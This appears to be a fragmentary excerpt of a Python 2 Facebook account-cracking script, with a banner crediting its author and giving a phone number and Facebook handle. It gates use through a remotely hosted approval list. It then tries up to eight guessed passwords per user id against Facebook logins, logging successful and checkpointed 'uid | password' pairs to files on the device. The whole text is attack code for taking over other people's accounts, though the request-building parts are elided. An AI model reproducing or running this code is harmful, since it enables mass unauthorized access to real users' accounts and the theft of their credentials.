...
logo =
'\n\x1b[1;97m********************************************
' \x1b[1;91m _______  _______  _______ __________________
' \x1b[1;96m(  ____ \(  ___  )(  ___  )\__   __/\__   __/
' \x1b[1;97m| (    \/| (   ) || (   ) |   ) (      ) (   
' \x1b[1;92m| (_____ | (___) || |   | |   | |      | |   
' \x1b[1;96m(_____  )|  ___  || |   | |   | |      | |   
' \x1b[1;91m      ) || (   ) || | /\| |   | |      | |   
' \x1b[1;96m/\____) || )   ( || (_\ \ |___) (______) (___
' \x1b[1;92m\_______)|/     \|(____\/_)\_______/\_______/
'\n\x1b[1;97m********************************************\n\x1b[1;93m      AUTHER    :     Saqii D'Lewixx \n\x1b[1;96m      Youtube    :     /Saqii Tech \n\x1b[1;95m        WP      :    03355879404 \xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\n\x1b[1;94m         FB      :     /baap.hu.tera.id.ura.ky.dekha\n\x1b[1;97m *******************************************\n\x1b[1;98m          Send id in messenger for approval\n\x1b[1;97m *******************************************\n'
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/baap.hu.tera.id.ura.ky.dekha/Saqii D'Lewixx /main/server.txt').text
    if to in r:
        ...
        print ''
        print ' \x1b[1;92mCopy token id and send to Saqii D'Lewixx '
        print ''
        print ' \x1b[1;92mYour id: ' + to
        print ''
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://www.facebook.com/baap.hu.tera.id.ura.ky.dekha')
        reg()
...
def a_s():
    ...
    print ''
    print 47 * '-'
    print '\t\x1b[1;32mUR D4D Saqii D'Lewixx\x1b[0;97m'
    print 47 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[Saqii-OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;93m[Saqii-CP] ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[Saqii-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;93m[Saqii-CP] ' + uid + ' | ' + pass2
                    cp = open('HOP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[Saqii-OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;93m[Saqii-CP] ' + uid + ' | ' + pass3
                        cp = open('HOP_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[Saqii-OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;93m[Saqii-CP] ' + uid + ' | ' + pass4
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[Saqii-OK] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;93m[Saqii-CP] ' + uid + ' | ' + pass5
                                cp = open('HOP_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[Saqii-OK] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;93m[Saqii-CP] ' + uid + ' | ' + pass6
                                    cp = open('HOP_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[Saqii-OK] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;93m[Saqii-CP] ' + uid + ' | ' + pass7
                                        cp = open('HOP_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[Saqii-OK] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;93m[Saqii-CP] ' + uid + ' | ' + pass8
                                            cp = open('HOP_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
